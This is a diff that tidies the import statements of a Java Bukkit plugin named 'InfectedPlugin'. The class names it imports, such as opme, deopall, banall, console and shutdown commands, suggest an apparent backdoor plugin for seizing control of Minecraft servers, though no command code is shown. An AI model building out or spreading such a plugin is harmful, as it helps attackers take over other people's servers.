@@ -1,31 +1,16 @@
 package org.CreeperCoders.InfectedPlugin;
 
-import java.util.Arrays;
-import java.util.logging.Level;
-import java.util.logging.Logger;
+import java.util.*;
+import java.util.logging.*;
 
-import org.CreeperCoders.InfectedPlugin.Commands.Command_ban;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_banall;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_console;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_deop;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_deopall;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_disableplugin;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_enableplugin;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_explosion;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_gamemode;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_help;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_name;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_op;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_opme;
-import org.CreeperCoders.InfectedPlugin.Commands.Command_shutdown;
-import org.CreeperCoders.InfectedPlugin.SlashCommands.IPCommand;
-import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
+import org.bukkit.*;
+import org.bukkit.command.*;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
+
+import org.CreeperCoders.InfectedPlugin.Commands.*;
+import org.CreeperCoders.InfectedPlugin.SlashCommands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
